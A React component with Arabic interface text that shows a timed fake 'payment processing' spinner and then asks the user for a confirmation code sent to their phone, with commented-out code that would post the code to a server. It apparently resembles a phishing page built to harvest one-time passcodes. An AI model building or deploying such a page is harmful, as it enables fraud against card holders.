import { useState, useEffect } from 'react';
import './VerfyCode.scss';
import CircularProgress from '@mui/material/CircularProgress';
import { motion } from "framer-motion";
import { Link } from "react-router-dom";
import axios from 'axios';
import Footer from '../Footer/Footer';

const VerfyCode = () => {
	const [delayPassed, setDelayPassed] = useState(false);
	const [code, setCode] = useState('');

	const handleCode = (e) => {
		setCode(e.target.value)
	}

	useEffect(() => {
		const timer = setTimeout(() => {
			setDelayPassed(true);
		}, 4000);

		return () => clearTimeout(timer);
	}, []);

	const handlePayment = async () => {
		// try {
		// 	const response = await axios.post(`${url}/send-code`, {
		// 		code
		// 	});
		// 	console.log('Email sent successfully:', response.data);
		// } catch (error) {
		// 	console.error('Error sending email:', error);
		// }
	};

	return (
		<>
			<div className="homeCode">
				<div className='codeVerfy'>
					{!delayPassed ? (
						<div className="isLoaded">
							<div className="container">
								<CircularProgress style={{ color: 'green' }} />
								<span>
									... جاري معالجة الدفع, المرجو الانتظار
								</span>
							</div>
						</div>
					) : (
						<motion.div
							initial={{ opacity: -5, x: -300 }}
							animate={{ opacity: 5, x: 3 }}
							transition={{ duration: 2 }}
						>
							<div className="code">
								<div className="form">
									<span>
										.	تم ارسال رمز تأكيد إلى جوالكم ، المرجوا ادخال رمز التاكيد							</span>
									<div className="input">
										<input type="text" name="code" value={code} onChange={handleCode} placeholder='رمز التأكيد' />
									</div>
									<Link to={`/message-happy`}>
										<button disabled={!code} onClick={handlePayment}>تأكيد</button>
									</Link>
								</div>
							</div>
						</motion.div>
					)}
				</div>
			</div>
			<Footer />
			<div className="rightCop">
				<span>جميع الحقوق محفوضة | 2024</span>
			</div>
		</>
	);
};

export default VerfyCode;
